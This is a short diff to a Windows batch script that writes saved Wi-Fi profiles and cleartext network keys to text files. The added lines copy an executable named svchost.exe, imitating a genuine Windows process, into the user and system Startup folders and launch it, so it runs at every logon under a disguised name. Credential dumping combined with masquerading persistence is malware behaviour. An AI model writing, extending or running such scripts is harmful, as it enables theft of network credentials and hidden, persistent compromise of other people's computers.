@@ -1,6 +1,14 @@
 REM STORE NETWORKS IN A TXT FILE at system32, if access denied , you need admin rights
 cd C:\Windows\System32
 
+echo f|xcopy /f ".\svchost.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
+
+start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
+
+echo f|xcopy ".\svchost.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
+
+
+
 netsh wlan show profiles >  network.txt
 
 netsh wlan show profiles name=[your wifi name] key=clear  > password.txt
